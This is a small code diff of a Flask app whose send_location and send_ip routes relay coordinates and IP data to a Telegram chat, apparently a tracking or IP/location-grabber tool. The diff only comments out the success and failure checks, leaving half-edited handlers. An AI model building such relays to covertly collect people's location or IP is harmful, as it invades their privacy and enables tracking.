@@ -20,9 +20,9 @@ def send_location():
     api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
     
     response = requests.get(api_url)
-    if response.status_code == 200:
+   # if response.status_code == 200:
        # return 'Location sent successfully!'
-    else:
+   # else:
      #   return 'Failed to send location.'
 
 @app.route('/send_ip', methods=['POST'])
@@ -37,9 +37,9 @@ def send_ip():
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
     
     response = requests.get(api_url)
-    if response.status_code == 200:
+   # if response.status_code == 200:
    #     return 'IP sent successfully!'
-    else:
+ #   else:
       #  return 'Failed to send IP.'
 
 if __name__ == '__main__':
